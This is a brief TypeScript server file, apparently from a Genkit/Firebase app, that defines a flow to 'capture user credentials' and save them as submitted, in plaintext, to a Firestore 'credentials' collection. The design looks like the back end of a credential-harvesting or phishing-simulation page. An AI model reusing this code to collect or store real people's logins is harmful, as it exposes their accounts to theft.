'use server';
/**
 * @fileOverview A flow to capture user credentials and save them to Firestore.
 *
 * - captureCredentialsFlow - A Genkit flow that receives and saves user credentials.
 */

import {ai} from '@/ai/genkit';
import type {CredentialsInput} from '@/ai/types/credentials';
import {CredentialsInputSchema} from '@/ai/types/credentials';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { initializeFirebaseServer } from '@/firebase/server';


export async function captureCredentials(input: CredentialsInput) {
  return await captureCredentialsFlow(input);
}


const captureCredentialsFlow = ai.defineFlow(
  {
    name: 'captureCredentialsFlow',
    inputSchema: CredentialsInputSchema,
    outputSchema: CredentialsInputSchema,
  },
  async (input: CredentialsInput) => {
    try {
      const { firestore } = initializeFirebaseServer();
      const credentialsCollection = collection(firestore, 'credentials');
      await addDoc(credentialsCollection, {
        ...input,
        createdAt: serverTimestamp(),
      });
    } catch (error) {
      console.error('Error saving credentials to Firestore:', error);
      // We will still return the input to the client to complete the flow.
      // The client-side logic is designed to show the alert regardless of success or failure.
    }
    
    // Return the input to signal completion to the client.
    return input;
  }
);
